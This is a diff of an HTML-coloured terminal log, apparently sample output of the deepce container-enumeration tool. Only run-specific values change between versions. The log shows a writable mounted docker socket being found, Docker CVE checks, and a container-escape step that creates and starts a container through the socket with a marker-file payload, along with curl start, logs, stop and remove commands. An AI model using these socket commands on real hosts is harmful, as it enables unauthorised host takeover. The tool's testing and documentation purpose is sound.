@@ -70,7 +70,7 @@ fetch https://dl-cdn.alpinelinux.org/alpine/v3.13/community/x86_64/APKINDEX.tar.
 (25/27) Installing pcre (8.44-r0)
 (26/27) Installing libssh2 (1.9.0-r1)
 (27/27) Installing nmap (7.91-r0)
-Executing busybox-1.32.1-r3.trigger
+Executing busybox-1.32.1-r5.trigger
 Executing ca-certificates-20191127-r5.trigger
 OK: 34 MiB in 41 packages
 <span style="font-weight:bold;color:#3333FF;">===================================</span><span style="font-weight:bold;color:lime;">( Enumerating Platform )</span><span style="font-weight:bold;color:#3333FF;">===================================</span>
@@ -81,7 +81,7 @@ OK: 34 MiB in 41 packages
 <span style="font-weight:bold;color:yellow;">[+]</span><span style="font-weight:bold;color:lime;"> Groups .................. </span><span style="font-weight:bold;filter: contrast(70%) brightness(190%);color:dimgray;"></span><span style="font-weight:bold;color:white;"></span><span style="font-weight:bold;color:white;background-color:red;">root</span><span style="font-weight:bold;filter: contrast(70%) brightness(190%);color:dimgray;"> bin daemon sys adm disk </span><span style="font-weight:bold;color:white;"></span><span style="font-weight:bold;color:white;background-color:red;">wheel</span><span style="font-weight:bold;filter: contrast(70%) brightness(190%);color:dimgray;"> floppy dialout tape video</span>
 <span style="font-weight:bold;color:yellow;">[+]</span><span style="font-weight:bold;color:lime;"> Docker Executable ....... </span><span style="font-weight:bold;filter: contrast(70%) brightness(190%);color:dimgray;">Not Found</span>
 <span style="font-weight:bold;color:yellow;">[+]</span><span style="font-weight:bold;color:lime;"> Docker Sock ............. </span><span style="font-weight:bold;color:yellow;">Yes</span>
-<span style="font-weight:bold;color:white;">srw-rw----    1 root     121            0 Mar 11 21:37 /var/run/docker.sock</span>
+<span style="font-weight:bold;color:white;">srw-rw----    1 root     121            0 Apr  2 12:17 /var/run/docker.sock</span>
 
 <span style="font-weight:bold;color:yellow;">[+]</span><span style="font-weight:bold;color:lime;"> Sock is writable ........ </span><span style="background-color:red;">Yes</span>
 <span style="font-weight:bold;filter: contrast(70%) brightness(190%);color:dimgray;">The docker sock is writable, we should be able to enumerate docker, create containers 
@@ -92,28 +92,28 @@ See </span><span style="text-decoration:underline;font-weight:bold;filter: contr
 
 <span style="font-weight:bold;filter: contrast(70%) brightness(190%);color:dimgray;">curl -s --unix-socket /var/run/docker.sock http://localhost/info</span>
 
-<span style="font-weight:bold;color:white;">KernelVersion:5.4.0-1040-azure
+<span style="font-weight:bold;color:white;">KernelVersion:5.4.0-1043-azure
 OperatingSystem:Ubuntu 20.04.2 LTS
 OSType:linux
 Architecture:x86_64
 NCPU:2
 DockerRootDir:/var/lib/docker
-Name:fv-az180-817
-ServerVersion:20.10.3+azure</span>
-<span style="font-weight:bold;color:yellow;">[+]</span><span style="font-weight:bold;color:lime;"> Docker Exploits ......... </span><span style="font-weight:bold;color:yellow;">20.10.3+azure</span>
+Name:fv-az180-525
+ServerVersion:20.10.5+azure</span>
+<span style="font-weight:bold;color:yellow;">[+]</span><span style="font-weight:bold;color:lime;"> Docker Exploits ......... </span><span style="font-weight:bold;color:yellow;">20.10.5+azure</span>
 <span style="font-weight:bold;color:yellow;">[+]</span><span style="font-weight:bold;color:lime;"> CVE–2019–13139 .......... </span><span style="font-weight:bold;filter: contrast(70%) brightness(190%);color:dimgray;">No</span>
 <span style="font-weight:bold;color:yellow;">[+]</span><span style="font-weight:bold;color:lime;"> CVE–2019–5736 ........... </span><span style="font-weight:bold;filter: contrast(70%) brightness(190%);color:dimgray;">No</span>
 <span style="font-weight:bold;color:#3333FF;">==================================</span><span style="font-weight:bold;color:lime;">( Enumerating Container )</span><span style="font-weight:bold;color:#3333FF;">===================================</span>
-<span style="font-weight:bold;color:yellow;">[+]</span><span style="font-weight:bold;color:lime;"> Container ID ............ </span><span style="font-weight:bold;color:yellow;">002d1087c5ca</span>
-<span style="font-weight:bold;color:yellow;">[+]</span><span style="font-weight:bold;color:lime;"> Container Full ID ....... </span><span style="font-weight:bold;color:yellow;">002d1087c5ca8a24645a8bc382eb2f07b3450757791501d04399e5e89a6f9ec9</span>
+<span style="font-weight:bold;color:yellow;">[+]</span><span style="font-weight:bold;color:lime;"> Container ID ............ </span><span style="font-weight:bold;color:yellow;">58500d7368d3</span>
+<span style="font-weight:bold;color:yellow;">[+]</span><span style="font-weight:bold;color:lime;"> Container Full ID ....... </span><span style="font-weight:bold;color:yellow;">58500d7368d3c726f5c01aa0baad183264e5a586791a980dab87fa7f6eba53de</span>
 <span style="font-weight:bold;color:yellow;">[+]</span><span style="font-weight:bold;color:lime;"> Container Name .......... </span><span style="font-weight:bold;color:red;">Could not get container name through reverse DNS</span>
 <span style="font-weight:bold;color:yellow;">[+]</span><span style="font-weight:bold;color:lime;"> Container IP ............ </span><span style="font-weight:bold;color:yellow;">172.17.0.2</span>
 <span style="font-weight:bold;color:yellow;">[+]</span><span style="font-weight:bold;color:lime;"> DNS Server(s) ........... </span><span style="font-weight:bold;color:yellow;">168.63.129.16 </span>
 <span style="font-weight:bold;color:yellow;">[+]</span><span style="font-weight:bold;color:lime;"> Host IP ................. </span><span style="font-weight:bold;color:yellow;">172.17.0.1</span>
 <span style="font-weight:bold;color:yellow;">[+]</span><span style="font-weight:bold;color:lime;"> Operating System ........ </span><span style="font-weight:bold;filter: contrast(70%) brightness(190%);color:dimgray;">Linux</span>
-<span style="font-weight:bold;color:yellow;">[+]</span><span style="font-weight:bold;color:lime;"> Kernel .................. </span><span style="font-weight:bold;filter: contrast(70%) brightness(190%);color:dimgray;">5.4.0-1040-azure</span>
+<span style="font-weight:bold;color:yellow;">[+]</span><span style="font-weight:bold;color:lime;"> Kernel .................. </span><span style="font-weight:bold;filter: contrast(70%) brightness(190%);color:dimgray;">5.4.0-1043-azure</span>
 <span style="font-weight:bold;color:yellow;">[+]</span><span style="font-weight:bold;color:lime;"> Arch .................... </span><span style="font-weight:bold;filter: contrast(70%) brightness(190%);color:dimgray;">x86_64</span>
-<span style="font-weight:bold;color:yellow;">[+]</span><span style="font-weight:bold;color:lime;"> CPU ..................... </span><span style="font-weight:bold;filter: contrast(70%) brightness(190%);color:dimgray;">Intel(R) Xeon(R) Platinum 8171M CPU @ 2.60GHz</span>
+<span style="font-weight:bold;color:yellow;">[+]</span><span style="font-weight:bold;color:lime;"> CPU ..................... </span><span style="font-weight:bold;filter: contrast(70%) brightness(190%);color:dimgray;">Intel(R) Xeon(R) CPU E5-2673 v4 @ 2.30GHz</span>
 <span style="font-weight:bold;color:yellow;">[+]</span><span style="font-weight:bold;color:lime;"> Useful tools installed .. </span><span style="font-weight:bold;color:yellow;">Yes</span>
 <span style="font-weight:bold;filter: contrast(70%) brightness(190%);color:dimgray;">/usr/bin/curl
 /usr/bin/wget
@@ -125,7 +125,7 @@ ServerVersion:20.10.3+azure</span>
 /usr/bin/nmap</span>
 <span style="font-weight:bold;color:yellow;">[+]</span><span style="font-weight:bold;color:lime;"> SSHD Service ............ </span><span style="font-weight:bold;filter: contrast(70%) brightness(190%);color:dimgray;">No</span>
 <span style="font-weight:bold;color:yellow;">[+]</span><span style="font-weight:bold;color:lime;"> Privileged Mode ......... </span><span style="font-weight:bold;filter: contrast(70%) brightness(190%);color:dimgray;">No</span>
-<span style="font-weight:bold;color:yellow;">[+]</span><span style="font-weight:bold;color:lime;"> Alpine Linux Version .... </span><span style="font-weight:bold;color:yellow;">3.13.2</span>
+<span style="font-weight:bold;color:yellow;">[+]</span><span style="font-weight:bold;color:lime;"> Alpine Linux Version .... </span><span style="font-weight:bold;color:yellow;">3.13.4</span>
 <span style="font-weight:bold;color:yellow;">[+]</span><span style="font-weight:bold;color:lime;"> └── CVE-2019-5021 ....... </span><span style="font-weight:bold;filter: contrast(70%) brightness(190%);color:dimgray;">No</span>
 <span style="font-weight:bold;color:#3333FF;">====================================</span><span style="font-weight:bold;color:lime;">( Enumerating Mounts )</span><span style="font-weight:bold;color:#3333FF;">====================================</span>
 <span style="font-weight:bold;color:yellow;">[+]</span><span style="font-weight:bold;color:lime;"> Docker sock mounted ....... </span><span style="background-color:red;">Yes</span>
@@ -139,7 +139,7 @@ See </span><span style="text-decoration:underline;font-weight:bold;filter: contr
 <span style="font-weight:bold;color:#3333FF;">====================================</span><span style="font-weight:bold;color:lime;">( Interesting Files )</span><span style="font-weight:bold;color:#3333FF;">=====================================</span>
 <span style="font-weight:bold;color:yellow;">[+]</span><span style="font-weight:bold;color:lime;"> Interesting environment variables ... </span><span style="font-weight:bold;filter: contrast(70%) brightness(190%);color:dimgray;">No</span>
 <span style="font-weight:bold;filter: contrast(70%) brightness(190%);color:dimgray;">HOME=/root
-HOSTNAME=002d1087c5ca
+HOSTNAME=58500d7368d3
 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 PWD=/
 SHLVL=1</span>
@@ -161,13 +161,13 @@ host machine, this can be used to enumerate further</span>
 <span style="font-weight:bold;color:yellow;">[+]</span><span style="font-weight:bold;color:lime;"> Custom Command ........... </span><span style="font-weight:bold;filter: contrast(70%) brightness(190%);color:dimgray;">touch /tmp/deepce-docker-alpine-payload-command.hacked</span>
 <span style="font-weight:bold;color:yellow;">[+]</span><span style="font-weight:bold;color:lime;"> Clean up ................. </span><span style="font-weight:bold;filter: contrast(70%) brightness(190%);color:dimgray;">Automatic on container exit</span>
 
-<span style="font-weight:bold;color:yellow;">[+]</span><span style="font-weight:bold;color:lime;"> Creating container ..... </span><span style="font-weight:bold;color:yellow;">c3ed459f96029731e3c67082fee62d9886660911b986be83fe488085c722320e</span>
+<span style="font-weight:bold;color:yellow;">[+]</span><span style="font-weight:bold;color:lime;"> Creating container ..... </span><span style="font-weight:bold;color:yellow;">6d8389c3aa2a47c39dbf53e4655befb754c96ebb9fdca3ba6bdd1cae41603d23</span>
 <span style="font-weight:bold;color:yellow;">[+]</span><span style="font-weight:bold;color:lime;"> If the shell dies you can restart your listener and run the start command to fire it again </span>
-<span style="font-weight:bold;filter: contrast(70%) brightness(190%);color:dimgray;">Start Command: curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/c3ed459f96029731e3c67082fee62d9886660911b986be83fe488085c722320e/start</span>
-<span style="font-weight:bold;filter: contrast(70%) brightness(190%);color:dimgray;">Logs Command: curl -s --unix-socket /var/run/docker.sock &quot;http://localhost/containers/c3ed459f96029731e3c67082fee62d9886660911b986be83fe488085c722320e/logs?stderr=1&amp;stdout=1&quot; --output -</span>
+<span style="font-weight:bold;filter: contrast(70%) brightness(190%);color:dimgray;">Start Command: curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/6d8389c3aa2a47c39dbf53e4655befb754c96ebb9fdca3ba6bdd1cae41603d23/start</span>
+<span style="font-weight:bold;filter: contrast(70%) brightness(190%);color:dimgray;">Logs Command: curl -s --unix-socket /var/run/docker.sock &quot;http://localhost/containers/6d8389c3aa2a47c39dbf53e4655befb754c96ebb9fdca3ba6bdd1cae41603d23/logs?stderr=1&amp;stdout=1&quot; --output -</span>
 <span style="font-weight:bold;color:yellow;">[+]</span><span style="font-weight:bold;color:lime;"> Once complete remember to tidy up by stopping and removing your container with following commands </span>
-<span style="font-weight:bold;filter: contrast(70%) brightness(190%);color:dimgray;">Stop Command: curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/c3ed459f96029731e3c67082fee62d9886660911b986be83fe488085c722320e/stop</span>
-<span style="font-weight:bold;filter: contrast(70%) brightness(190%);color:dimgray;">Remove Command: curl -s -XDELETE --unix-socket /var/run/docker.sock http://localhost/containers/c3ed459f96029731e3c67082fee62d9886660911b986be83fe488085c722320e</span>
+<span style="font-weight:bold;filter: contrast(70%) brightness(190%);color:dimgray;">Stop Command: curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/6d8389c3aa2a47c39dbf53e4655befb754c96ebb9fdca3ba6bdd1cae41603d23/stop</span>
+<span style="font-weight:bold;filter: contrast(70%) brightness(190%);color:dimgray;">Remove Command: curl -s -XDELETE --unix-socket /var/run/docker.sock http://localhost/containers/6d8389c3aa2a47c39dbf53e4655befb754c96ebb9fdca3ba6bdd1cae41603d23</span>
 <span style="font-weight:bold;color:yellow;">[+]</span><span style="font-weight:bold;color:lime;"> Starting container ..... </span><span style="font-weight:bold;color:yellow;">Success</span>
 <span style="font-weight:bold;color:yellow;">[+]</span><span style="font-weight:bold;color:lime;"> Sleeping for ........... </span><span style="font-weight:bold;filter: contrast(70%) brightness(190%);color:dimgray;">2s</span>
 <span style="font-weight:bold;color:yellow;">[+]</span><span style="font-weight:bold;color:lime;"> Fetching logs .......... </span><span style="font-weight:bold;color:yellow;">Success</span>
